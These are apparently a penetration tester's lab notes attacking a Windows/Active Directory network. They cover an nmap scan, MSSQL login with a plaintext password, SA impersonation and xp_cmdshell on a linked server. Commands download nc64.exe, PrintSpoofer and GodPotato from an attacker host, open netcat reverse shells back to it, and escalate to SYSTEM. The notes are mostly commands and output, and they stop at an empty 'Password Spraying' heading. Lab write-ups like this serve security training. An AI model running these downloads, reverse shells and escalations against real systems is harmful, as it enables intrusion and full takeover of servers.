```
 nmap -T4 -sV -Pn 192.168.210.10-16
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 10:44 PST
Nmap scan report for ZPH-SVRDC01 (192.168.210.10)
Host is up (0.079s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-18 18:44:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.210.11
Host is up (0.079s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.210.12
Host is up (0.083s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.210.13
Host is up (0.076s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.210.14
Host is up (0.079s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp open  msrpc         Microsoft Windows RPC
443/tcp open  https?
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.210.15
Host is up (0.084s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.210.16
Host is up (0.080s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-18 18:44:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
Service Info: Host: ZPH-SVRCDC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 7 IP addresses (7 hosts up) scanned in 81.39 seconds

```

# ZPH-SVRSQL01

## MSSQL
## Impacket-MSSQLclient
```
impacket-mssqlclient zabbix@192.168.210.15
```

Password: rDhHbBEfh35sMbkY

### Listing users

```
SQL> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
login
```

![[Pasted image 20231121073047.png]]

### Impersonate SA
```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![[Pasted image 20231121073713.png]]

### Enumeration
Versions
![[Pasted image 20231121090553.png]]
Linked Servers
![[Pasted image 20231121090637.png]]

### Transfer NC64.exe
```
SQL> xp_cmdshell "powershell iwr http://10.10.14.21/nc64.exe -O C:\users\public\Downloads\nc64.exe"
```

```
xp_cmdshell "C:\Users\Public\Downloads\nc64.exe 10.10.14.21 80 -e cmd.exe"
```
### ReverseShell
```
❯ sudo nc -lvnp 80
Listening on 0.0.0.0 80
Connection received on 10.10.110.35 60070
Microsoft Windows [Version 10.0.17763.4377]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Privilege Escalation
```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

## Enumeration
```
C:\Windows\system32>systeminfo
systeminfo

Host Name:                 ZPH-SVRSQL01
OS Name:                   Microsoft Windows Server 2019 Standard

```

## File Transfer Payload

### Printspoofer
```
powershell iwr http://10.10.14.21:443/PrintSpoofer64.exe -O C:\Users\Public\Downloads\ps.exe
```

### God Potato
```
powershell iwr http://10.10.14.21:443/GodPotato-NET4.exe -O C:\Users\Public\Downloads\gp.exe
```

```
C:\Users\Public\Downloads>gp.exe -cmd "cmd /c whoami"
gp.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140708901355520
[*] DispatchTable: 0x140708903661680
[*] UseProtseqFunction: 0x140708903037856
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000cc02-07e8-ffff-eef8-fa2938f9e6eb
[*] DCOM obj OXID: 0xb0383f00015a9686
[*] DCOM obj OID: 0xad2d0adacdfa9d91
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] CreateNamedPipe \\.\pipe\a3624ff8-ce0a-4aa3-8e33-db8d99bbba04\pipe\epmapper
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 760 Token:0x924  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1096
nt authority\system

```

### Exploit
```
C:\Users\Public\Downloads>gp.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.21 443"
```

```
❯ sudo nc -lvnp 443
[sudo] password for p3ta: 
Listening on 0.0.0.0 443
Connection received on 10.10.110.35 52906
Microsoft Windows [Version 10.0.17763.4377]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public\Downloads>whoami
whoami
nt authority\system

C:\Users\Public\Downloads>
```

# ZSM-SVRCSQL02
Going back to the linked server
```
EXECUTE ('select @@servername;') at [ZSM-SVRCSQL02];
```

## Enable xp_cmdshell
```
EXECUTE ('EXEC sp_configure "show advanced options",1') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('reconfigure') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('EXEC sp_configure "xp_cmdshell",1') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('reconfigure') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('xp_cmdshell "whoami"') at [ZSM-SVRCSQL02];
```

![[Pasted image 20231121091718.png]]

## RevserseShell
Transfer nc64.exe

```
EXECUTE ('xp_cmdshell "powershell iwr http://10.10.14.21:443/nc64.exe -O C:\users\public\downloads\nc64.exe"') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('xp_cmdshell "c:\users\public\downloads\nc64.exe 10.10.14.21 443 -e cmd.exe"') at [ZSM-SVRCSQL02];
```

```
❯ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.110.35 5232
Microsoft Windows [Version 10.0.20348.1726]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
internal\mssql_svc
```

```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

## IPconfig
```
C:\Users>ipconfig 
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::8710:aef6:30df:c771%6
   IPv4 Address. . . . . . . . . . . : 192.168.210.19
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.210.1

```

## Privilege Escalation

### Transfer God Potato
```
powershell iwr http://10.10.14.21/GodPotato-NET4.exe -O C:\users\public\downloads\gp.exe

```

### Exploit
```
gp.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.21 80"
```

![[Pasted image 20231121093744.png]]

### Password Spraying